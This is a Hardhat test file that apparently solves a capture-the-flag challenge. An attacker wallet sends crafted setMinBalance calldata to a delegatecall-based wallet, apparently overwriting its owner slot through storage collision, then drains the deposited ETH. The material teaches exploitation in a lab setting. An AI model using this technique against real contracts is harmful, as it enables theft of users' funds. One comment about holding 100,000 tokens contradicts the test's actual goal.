import { ethers } from "hardhat";
import { expect } from "chai";
import { constants, utils } from "ethers";

describe("DelegateWallet", function () {
  it("should allow attacker be able withdraw Ethers", async () => {
    // Complete this challenge by having the deployer hold 100,000 tokens
    const [deployer] = await ethers.getSigners();
    const provider = deployer.provider;
    if (!provider) throw new Error("Unable to get provider");
    const attacker = ethers.Wallet.createRandom().connect(provider);
    await deployer.sendTransaction({
      to: attacker.address,
      value: constants.WeiPerEther,
    });

    // Deploy the contract
    const WalletLib = await ethers.getContractFactory("WalletLib");
    const walletLib = await WalletLib.deploy();
    await walletLib.deployed();

    const DelegateWallet = await ethers.getContractFactory("DelegateWallet");
    const delegateWallet = await DelegateWallet.deploy(walletLib.address);
    await delegateWallet.deployed();

    // Deployer to deposit ETH to wallet
    await delegateWallet.deposit({ value: constants.WeiPerEther.mul(10) });

    // Exploit start
    const contractInterface = new utils.Interface([
      "function setMinBalance(uint256 balance)",
    ]);
    const data = contractInterface.encodeFunctionData("setMinBalance", [
      attacker.address,
    ]);
    await attacker.sendTransaction({ to: delegateWallet.address, data });
    await delegateWallet
      .connect(attacker)
      .withdraw(constants.WeiPerEther.mul(10));
    // Exploit end

    // Completion condition
    expect(await provider.getBalance(attacker.address)).to.be.gt(
      constants.WeiPerEther.mul(10)
    );
  });
});
